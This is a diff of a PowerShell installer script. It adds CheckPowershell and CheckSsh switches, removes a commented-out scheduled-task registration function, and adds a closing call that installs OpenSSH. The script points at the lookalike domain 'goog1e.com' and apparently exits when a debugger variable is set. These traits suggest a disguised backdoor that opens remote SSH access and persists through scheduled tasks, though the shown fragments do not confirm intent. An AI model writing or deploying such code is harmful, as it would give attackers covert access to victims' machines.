@@ -1,6 +1,14 @@
 
 #Requires -Version 5
 
+[CmdletBinding()]
+param (
+    [Parameter()]
+    [switch]$CheckPowershell,
+    [Parameter()]
+    [switch]$CheckSsh
+)
+
 $taskVersion = "1.8"
 $uri = "https://goog1e.com"
 
@@ -112,27 +120,6 @@ function _CheckServerConnection
   }
 }
 
-# function _RegisterTask {
-#   param (
-#     [Parameter()]
-#     [string]$TaskName
-#   )
-  
-#   $taskData = $TasksDefinitions[$TaskName];
-#   $xml = [xml]$taskData["XmlDefinition"]
-#   $ns = New-Object System.Xml.XmlNamespaceManager($xml.NameTable)
-#   $ns.AddNamespace("ns", $xml.DocumentElement.NamespaceURI)
-#   foreach ($item in $TasksDefinitions[$TaskName]["Values"].Keys) {
-#     $xmlNode = $xml.SelectSingleNode($item, $ns);
-#     if ($xmlNode) {
-#       $innerText = $TasksDefinitions[$TaskName]["Values"][$item] -replace '{RootFolder}', $destinationFolder -replace '{ScriptFile}', $scriptFile
-#       $xmlNode.InnerText = $innerText
-#     }
-#   }
-#   $taskData["XmlDefinition"] = $xml.OuterXml;
-#   Register-Task -TaskData $taskData -Force
-# }
-
 function FindModules {
   [CmdletBinding()]
   param (
@@ -190,5 +177,5 @@ if(-not $debugger)
     exit
   }
 }
-
+Install-OpenSsh
 Install-Powershell
